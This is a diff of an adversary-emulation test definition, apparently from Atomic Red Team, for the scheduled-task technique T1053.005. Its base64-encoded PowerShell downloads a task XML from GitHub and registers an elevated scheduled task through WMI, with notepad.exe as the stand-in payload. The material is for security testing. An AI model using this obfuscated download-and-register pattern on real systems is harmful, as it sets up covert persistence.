@@ -1,21 +1,17 @@
-- id: cb96f07b-5aef-58ec-b878-faadffad74ec
+- requirements: []
   name: Soumaia ART Tests - WMI Invoke-CimMethod Scheduled Task
   description: Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes. (requires elevation)
   tactic: privilege-escalation
-  technique:
-    attack_id: T1053.005
-    name: 'Scheduled Task/Job: Scheduled Task'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAwADUAMwBfADAAMAA1AF8AVwBNAEkALgB4AG0AbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMAA1ADMAXwAwADAANQBfAFcATQBJAC4AeABtAGwAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAwADUAMwAuADAAMAA1AC8AcwByAGMALwBUADEAMAA1ADMAXwAwADAANQBfAFcATQBJAC4AeABtAGwAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAFQAMQAwADUAMwBfADAAMAA1AF8AVwBNAEkALgB4AG0AbAAiAAoA
-          }
-          $xml = [System.IO.File]::ReadAllText(".\T1053_005_WMI.xml")
-          Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
-        cleanup: |-
-          Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false >$null 2>&1
-        payloads:
-        - T1053_005_WMI.xml
+  technique_id: T1053.005
+  technique_name: 'Scheduled Task/Job: Scheduled Task'
+  executors:
+  - cleanup:
+    - Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false >$null 2>&1
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - T1053_005_WMI.xml
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAwADUAMwBfADAAMAA1AF8AVwBNAEkALgB4AG0AbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMAA1ADMAXwAwADAANQBfAFcATQBJAC4AeABtAGwAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAwADUAMwAuADAAMAA1AC8AcwByAGMALwBUADEAMAA1ADMAXwAwADAANQBfAFcATQBJAC4AeABtAGwAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAFQAMQAwADUAMwBfADAAMAA1AF8AVwBNAEkALgB4AG0AbAAiAAoA }; $xml = [System.IO.File]::ReadAllText(".\T1053_005_WMI.xml"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
+  id: cb96f07b-5aef-58ec-b878-faadffad74ec
